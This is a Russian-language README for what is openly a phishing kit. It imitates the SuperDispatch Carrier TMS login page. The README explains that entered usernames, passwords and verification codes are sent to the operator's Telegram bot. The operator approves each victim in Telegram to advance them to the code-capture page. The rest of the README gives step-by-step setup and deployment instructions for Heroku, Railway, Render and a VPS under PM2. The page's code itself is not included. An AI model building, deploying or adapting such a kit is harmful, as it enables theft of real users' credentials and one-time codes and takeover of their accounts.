# SuperDispatch Carrier TMS - Login Page

Визуально идентичная страница входа с отправкой данных в Telegram.

## 🚀 Быстрый запуск (локально)

### Установка зависимостей
```bash
npm install
```

### Настройка переменных окружения
Создайте файл `.env` в корне проекта:
```env
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
TELEGRAM_CHAT_ID=your_telegram_chat_id_here
PORT=8000
NODE_ENV=development
```

### Запуск сервера
```bash
npm start
```
или
```bash
node server.js
```

Затем откройте: http://localhost:8000

## 🌍 Деплой на глобальный сервер

### Подготовка к деплою

1. **Установите зависимости:**
   ```bash
   npm install
   ```

2. **Создайте файл `.env` на сервере:**
   ```env
   TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
   TELEGRAM_CHAT_ID=your_telegram_chat_id_here
   PORT=8000
   NODE_ENV=production
   ```

3. **Настройте порт:**
   - Если используете хостинг (Heroku, Railway, Render и т.д.), они автоматически устанавливают переменную `PORT`
   - Для собственного сервера укажите нужный порт в `.env`

### Варианты деплоя

#### 1. Heroku
```bash
heroku create your-app-name
heroku config:set TELEGRAM_BOT_TOKEN=your_token
heroku config:set TELEGRAM_CHAT_ID=your_chat_id
git push heroku main
```

#### 2. Railway
- Подключите репозиторий
- Добавьте переменные окружения в настройках
- Railway автоматически определит `package.json` и запустит `npm start`

#### 3. Render
- Создайте новый Web Service
- Подключите репозиторий
- Укажите команду запуска: `npm start`
- Добавьте переменные окружения

#### 4. VPS (собственный сервер)
```bash
# Установите Node.js
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs

# Клонируйте проект
git clone your-repo-url
cd SuperDispatch

# Установите зависимости
npm install

# Создайте .env файл
nano .env

# Запустите через PM2 (рекомендуется)
npm install -g pm2
pm2 start server.js --name superdispatch
pm2 save
pm2 startup
```

### Использование PM2 для продакшена

PM2 позволяет автоматически перезапускать приложение при сбоях:

```bash
# Установка PM2
npm install -g pm2

# Запуск приложения
pm2 start server.js --name superdispatch

# Сохранение конфигурации
pm2 save

# Настройка автозапуска при перезагрузке сервера
pm2 startup
```

## 📋 Что делает страница

1. Отображает форму входа, идентичную оригиналу
2. При вводе логина и пароля отправляет их в ваш Telegram через бота
3. При нажатии "Yes" в Telegram боте перенаправляет на страницу верификации
4. При вводе кода верификации отправляет его в Telegram

## 🔧 Настройка Telegram бота

1. Создайте бота через [@BotFather](https://t.me/botfather)
2. Получите токен бота
3. Получите Chat ID через [@userinfobot](https://t.me/userinfobot)
4. Добавьте токен и Chat ID в файл `.env`

## ⚠️ Важно

- **НЕ коммитьте файл `.env`** в Git (он уже в `.gitignore`)
- Для продакшена используйте переменные окружения
- Убедитесь, что порт доступен извне (проверьте firewall)
- Рекомендуется использовать HTTPS для продакшена

## 📁 Структура проекта

```
SuperDispatch/
├── index.html          # Главная страница входа
├── verification.html    # Страница верификации кода
├── server.js           # Node.js сервер
├── package.json        # Зависимости проекта
├── .env                # Переменные окружения (не в Git)
├── .gitignore          # Игнорируемые файлы
└── README.md           # Документация
```

## 🛠️ Технические детали

- **Node.js**: >= 14.0.0
- **Порт по умолчанию**: 8000
- **Polling Telegram**: каждую секунду
- **Хранение статусов**: в памяти (сбрасывается при перезапуске)
